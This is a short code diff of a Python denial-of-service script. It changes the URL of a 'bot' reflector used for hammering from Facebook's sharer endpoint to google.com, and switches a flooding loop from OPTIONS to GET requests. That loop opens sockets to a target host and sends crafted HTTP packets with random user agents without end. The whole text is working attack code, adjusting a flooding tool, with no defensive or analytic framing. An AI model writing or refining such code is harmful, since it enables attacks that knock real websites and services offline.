@@ -26,7 +26,7 @@ def user_agent():
 def my_bots():
 	global bots
 	bots=[]
-	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://www.google.com/")
 	return(bots)
 
 
@@ -43,7 +43,7 @@ def bot_hammering(url):
 def down_it(item):
 	try:
 		while True:
-			packet = str("OPTIONS / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
+			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
